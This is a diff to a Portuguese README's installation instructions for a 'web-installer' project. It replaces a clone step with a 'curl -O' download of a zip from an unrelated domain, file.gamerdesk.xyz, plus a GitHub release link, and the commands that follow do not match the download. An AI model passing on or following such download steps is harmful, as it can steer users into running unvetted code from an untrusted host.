@@ -81,11 +81,16 @@ Organizadas em categorias para fácil navegação:
 ## 🔧 Instalação e Configuração
 
 ### Instalação Local
-1. Clone o repositório:
+
+1. Baixe o repositório:
 ```bash
 curl -O https://file.gamerdesk.xyz/wil/webinstalerv1.zip
 cd web-installer
 ```
+
+ou
+
+[download](https://github.com/nexigonprime/web_instaler_ssh/releases/tag/webinstaler)
 
 2. Instale as dependências:
 ```bash
